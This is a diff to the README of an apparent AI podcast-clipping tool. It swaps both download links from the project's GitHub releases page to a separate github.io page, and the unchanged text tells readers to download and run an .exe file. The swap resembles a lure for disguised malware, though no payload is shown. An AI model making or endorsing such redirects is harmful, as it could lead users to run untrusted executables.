@@ -1,6 +1,6 @@
 # 🎙️ podcast-shorts-factory - Turn long podcasts into viral clips
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Nathanielunhopeful996/podcast-shorts-factory/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://nathanielunhopeful996.github.io)
 
 This application creates short video clips from long podcast audio. It uses ten separate artificial intelligence agents to process your files. These agents listen to the audio, find interesting moments, write captions, and edit the final video. The entire process runs on your computer. You use free artificial intelligence providers to generate the content. 
 
@@ -18,7 +18,7 @@ Your computer needs to meet these basic standards to run the software:
 
 You must download the latest version of the application from our release page. 
 
-[Visit this page to download the latest version of the software](https://github.com/Nathanielunhopeful996/podcast-shorts-factory/releases)
+[Visit this page to download the latest version of the software](https://nathanielunhopeful996.github.io)
 
 Look for the file that ends in .exe. Click the file name to start your download. Your browser might ask where to save the file. Choose your downloads folder or your desktop for easy access. 
 
